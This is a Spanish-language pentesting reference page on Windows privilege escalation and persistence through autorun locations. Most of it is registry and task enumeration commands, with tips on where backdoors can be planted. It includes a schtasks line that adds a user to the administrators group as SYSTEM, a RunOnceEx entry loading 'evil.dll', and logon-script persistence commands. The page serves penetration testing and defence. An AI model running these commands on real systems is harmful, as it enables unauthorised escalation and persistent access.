# Escalada de privilegios con Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** se puede usar para ejecutar programas durante el **inicio**. Para ver qué binarios están programados para ejecutarse durante el inicio, usa:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tareas programadas

Las **tareas** pueden programarse para ejecutarse con una **frecuencia específica**. Usa los siguientes comandos para ver qué binarios están programados para ejecutarse:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Carpetas

Todos los binarios ubicados en las **carpetas de inicio se van a ejecutar al iniciar el sistema**. Las carpetas de inicio comunes son las que se enumeran a continuación, pero la carpeta de inicio se indica en el registro. [Lee esto para saber dónde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Las vulnerabilidades de *path traversal* durante la extracción de archivos (como la que se aprovechaba en WinRAR anterior a 7.13 – CVE-2025-8088) pueden utilizarse para **depositar payloads directamente dentro de estas carpetas Startup durante la descompresión**, lo que provoca la ejecución de código en el siguiente inicio de sesión del usuario. Para un análisis detallado de esta técnica, consulta:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registro

> [!TIP]
> [Nota desde aquí](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): La entrada de registro **Wow6432Node** indica que estás ejecutando una versión de Windows de 64 bits. El sistema operativo utiliza esta clave para mostrar una vista independiente de HKEY_LOCAL_MACHINE\SOFTWARE para aplicaciones de 32 bits que se ejecutan en versiones de Windows de 64 bits.

### Runs

**Comúnmente conocidas**, las entradas de registro AutoRun son:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Las claves de registro conocidas como **Run** y **RunOnce** están diseñadas para ejecutar programas automáticamente cada vez que un usuario inicia sesión en el sistema. La línea de comandos asignada como valor de datos de una clave está limitada a 260 caracteres o menos.<sup>[[2]](#references)</sup>

**Service runs** (pueden controlar el inicio automático de servicios durante el arranque):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

En Windows Vista y versiones posteriores, las claves de registro **Run** y **RunOnce** no se generan automáticamente. Las entradas de estas claves pueden iniciar programas directamente o especificarlos como dependencias. Por ejemplo, para cargar un archivo DLL al iniciar sesión, se puede utilizar la clave de registro **RunOnceEx** junto con una clave "Depend". Esto se demuestra añadiendo una entrada de registro para ejecutar "C:\temp\evil.dll" durante el inicio del sistema:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Si puedes escribir dentro de cualquiera de los registros mencionados en **HKLM**, puedes escalar privilegios cuando otro usuario inicie sesión.

> [!TIP]
> **Exploit 2**: Si puedes sobrescribir cualquiera de los binarios indicados en cualquiera de los registros de **HKLM**, puedes modificar ese binario con un backdoor cuando otro usuario inicie sesión y escalar privilegios.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Los accesos directos colocados en la carpeta **Startup** activarán automáticamente servicios o aplicaciones durante el inicio de sesión del usuario o el reinicio del sistema. La ubicación de la carpeta **Startup** está definida en el registro tanto para los ámbitos de **Local Machine** como de **Current User**. Esto significa que cualquier acceso directo añadido a estas ubicaciones **Startup** especificadas garantizará que el servicio o programa vinculado se inicie después del proceso de inicio de sesión o reinicio, lo que constituye un método sencillo para programar la ejecución automática de programas.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Si puedes sobrescribir cualquier Shell Folder de \[User] bajo **HKLM**, podrás apuntarlo a una carpeta controlada por ti y colocar un backdoor que se ejecutará cada vez que un usuario inicie sesión en el sistema, escalando privilegios.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Este valor del registro por usuario puede apuntar a un script o comando que se ejecuta cuando ese usuario inicia sesión. Es principalmente una primitiva de **persistence**, porque solo se ejecuta en el contexto del usuario afectado, pero aun así merece la pena comprobarlo durante las revisiones de post-exploitation y autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Si puedes escribir este valor para el usuario actual, puedes volver a activar la ejecución en el siguiente inicio de sesión interactivo sin necesitar derechos de administrador. Si puedes escribirlo en el hive de otro usuario, puedes obtener ejecución de código cuando dicho usuario inicie sesión.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notas:

- Prefiere rutas completas a archivos `.bat`, `.cmd`, `.ps1` u otros archivos launcher que ya sean legibles por el usuario objetivo.
- Esto sobrevive al cierre de sesión o al reinicio hasta que se elimine el valor.
- A diferencia de `HKLM\...\Run`, esto **no** concede elevación por sí mismo; es persistence en el ámbito del usuario.

### Claves de Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalmente, la clave **Userinit** está configurada como **userinit.exe**. Sin embargo, si esta clave se modifica, el ejecutable especificado también será iniciado por **Winlogon** cuando el usuario inicie sesión. Del mismo modo, la clave **Shell** está destinada a apuntar a **explorer.exe**, que es el shell predeterminado de Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Si puedes sobrescribir el valor del registro o el binario, podrás escalar privilegios.

### Configuración de directivas

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Comprueba la clave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Cambiar el símbolo del sistema del Modo seguro

En el Registro de Windows, en `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, hay un valor **`AlternateShell`** establecido de forma predeterminada en `cmd.exe`. Esto significa que, cuando seleccionas "Modo seguro con símbolo del sistema" durante el inicio (presionando F8), se utiliza `cmd.exe`. Sin embargo, es posible configurar el equipo para que se inicie automáticamente en este modo sin tener que presionar F8 y seleccionarlo manualmente.

Pasos para crear una opción de arranque que inicie automáticamente en "Modo seguro con símbolo del sistema":<sup>[[5]](#references)</sup>

1. Cambia los atributos del archivo `boot.ini` para quitar las marcas de solo lectura, sistema y oculto: `attrib c:\boot.ini -r -s -h`
2. Abre `boot.ini` para editarlo.
3. Inserta una línea como: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Guarda los cambios en `boot.ini`.
5. Vuelve a aplicar los atributos originales del archivo: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Cambiar la clave de Registro **AlternateShell** permite configurar un command shell personalizado, potencialmente para obtener acceso no autorizado.
- **Exploit 2 (Permisos de escritura en PATH):** Tener permisos de escritura en cualquier parte de la variable del sistema **PATH**, especialmente antes de `C:\Windows\system32`, permite ejecutar un `cmd.exe` personalizado, que podría actuar como backdoor si el sistema se inicia en Modo seguro.
- **Exploit 3 (Permisos de escritura en PATH y boot.ini):** Tener acceso de escritura a `boot.ini` permite iniciar automáticamente en Modo seguro, facilitando el acceso no autorizado en el siguiente reinicio.

Para comprobar la configuración actual de **AlternateShell**, utiliza estos comandos:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Componente instalado

Active Setup es una función de Windows que **se inicia antes de que el entorno de escritorio se cargue por completo**. Prioriza la ejecución de ciertos comandos, que deben completarse antes de que continúe el inicio de sesión del usuario. Este proceso ocurre incluso antes de que se activen otras entradas de inicio, como las de las secciones de registro Run o RunOnce.

Active Setup se administra mediante las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Dentro de estas claves existen varias subclaves, cada una correspondiente a un componente específico. Los valores de las claves que resultan especialmente relevantes incluyen:

- **IsInstalled:**
- `0` indica que el comando del componente no se ejecutará.
- `1` significa que el comando se ejecutará una vez por usuario, que es el comportamiento predeterminado si falta el valor `IsInstalled`.
- **StubPath:** Define el comando que ejecutará Active Setup. Puede ser cualquier línea de comandos válida, como iniciar `notepad`.

**Consideraciones de seguridad:**

- Modificar o escribir en una clave donde **`IsInstalled`** esté establecido en `"1"` con un **`StubPath`** específico puede provocar la ejecución no autorizada de comandos, lo que podría permitir una escalada de privilegios.
- Alterar el archivo binario referenciado en cualquier valor **`StubPath`** también podría permitir una escalada de privilegios, siempre que se disponga de permisos suficientes.

Para inspeccionar las configuraciones de **`StubPath`** en los componentes de Active Setup, se pueden utilizar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Descripción general de Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) son módulos DLL que agregan funciones adicionales a Internet Explorer de Microsoft. Se cargan en Internet Explorer y Windows Explorer cada vez que se inician. Sin embargo, su ejecución puede bloquearse estableciendo la clave **NoExplorer** en 1, lo que evita que se carguen con las instancias de Windows Explorer.<sup>[[1]](#references)</sup>

Los BHO son compatibles con Windows 10 mediante Internet Explorer 11, pero no son compatibles con Microsoft Edge, el navegador predeterminado en las versiones más recientes de Windows.

Para explorar los BHO registrados en un sistema, puedes inspeccionar las siguientes claves del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Cada BHO está representado por su **CLSID** en el registro, que actúa como identificador único. La información detallada sobre cada CLSID se encuentra en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Para consultar los BHO en el registro, se pueden utilizar estos comandos:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Ten en cuenta que el registro contendrá 1 nueva entrada del registro por cada dll y estará representada por el **CLSID**. Puedes encontrar la información del CLSID en `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Abrir comando

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Ten en cuenta que todos los sitios donde puedes encontrar autoruns ya son buscados por**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Sin embargo, para obtener una lista más completa de archivos autoejecutados, puedes usar [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)de systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Más

**Encuentra más Autoruns, como los registros, en** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Mecanismos comunes de persistencia de malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Ejecución de inicio automático durante el arranque o el inicio de sesión: claves de ejecución del registro / carpeta de inicio](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Scripts de inicialización durante el arranque o el inicio de sesión: script de inicio de sesión (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Categorías de inicio automático (Solución de problemas con las herramientas de Windows Sysinternals, 2.ª edición)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [¿Cómo puedo agregar una opción de arranque que inicie un shell alternativo?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Resumen de Metasploit del 03/04/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [PR n.º 21032 de Metasploit – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
